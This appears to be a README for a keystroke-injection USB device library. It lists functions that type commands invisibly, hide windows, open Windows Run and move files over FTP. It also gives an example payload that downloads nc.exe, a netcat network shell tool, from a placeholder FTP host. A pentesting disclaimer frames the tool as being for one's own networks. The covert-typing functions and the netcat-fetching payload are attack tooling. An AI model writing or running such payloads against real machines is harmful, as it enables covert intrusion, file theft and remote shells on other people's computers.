<hr>
<h5>Orbit Digi USB, More info => http://www.orbitsolutions.com/</h5>
<hr>

<b>DISCLAIMER</b>: Orbit Digi USB dirancang untuk digunakan dalam pengujian dan penemuan kekurangan pada jaringannya sendiri dengan tujuan memperbaiki kekurangan yang terdeteksi, <b>JANGAN</b> gunakan program di jaringan atau perangkat yang Anda tidak memiliki izin, kami tidak bertanggung jawab atas kerusakan yang Anda timbulkan dengan menggunakan perangkat lunak atau perangkat keras ini.
<hr/> 


OrbitKeyboard Function List
----
<b>pressAndRelease</b> = Press a key or combination of keyboard and release. usage : pressAndRelease(key_ALT, key_TAB)</br>
<b>press</b> = Press a key or combination of keyboard without release. usage : press(key_ALT, key_TAB)</br>
<b>release</b> = release a key or combination of keyboard. usage : release()</br>
<b>echo</b> = write a text without enter/newline/return. usage : echo("text")</br>
<b>echoEnter</b> = write the text and enter/newline/return. usage : echoEnter("text")</br>
<b>sleep</b> = delay or sleep for "n" milisecond. usage : sleep(5)</br>
<b>winRun</b> = open Windows Run and type a Windows command. usage : winRun("command")</br>
<b>hideWindow</b> = hide an active window not minimize. usage : hideWindow()</br>
<b>writeOnBackground</b> = make the window is not visible, and keep writing. usage : writeOnBackground("text")</br>
<b>minimizeWindow</b> = minimize an active window. usage : minimizeWindow()</br>
<b>winFTP</b> = download a file from FTP server or upload file to FTP server. usage : winFTP("put/get/mput/mget","FTPusername","FTPpassword","FTPhost","FTPport","filename")</br>
<b>done</b> = Turn the LED off when payload is loaded. usage : done()</br>


Example Payload
----
```c
#include <OrbitKeyboard.h>

OrbitSolutionsKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Download single file
  en.winFTP("get","user_ftp","pass_ftp","host_ftp", "port_ftp","nc.exe");
}

void loop() {
  
}


```
[More Payload](https://github.com/ChandraOrbit/OrbitDigiUSB/tree/master/libraries/OrbitKeyboard/examples)
